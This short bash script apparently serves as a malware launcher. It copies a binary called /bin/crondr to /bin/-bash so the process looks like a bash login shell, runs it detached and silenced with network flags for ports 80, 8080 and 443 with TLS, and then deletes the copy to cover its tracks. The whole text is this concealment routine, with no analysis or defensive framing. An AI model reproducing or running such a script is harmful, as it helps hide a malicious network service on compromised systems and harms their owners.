#!/bin/bash
cp -f -r -- /bin/crondr /bin/-bash 2>/dev/null
cd /bin 2>/dev/null
./-bash -c -p 80 -p 8080 -p 443 -tls -dp 80 -dp 8080 -dp 443 -tls  -d >/dev/null 2>&1
rm -rf -- -bash 2>/dev/null
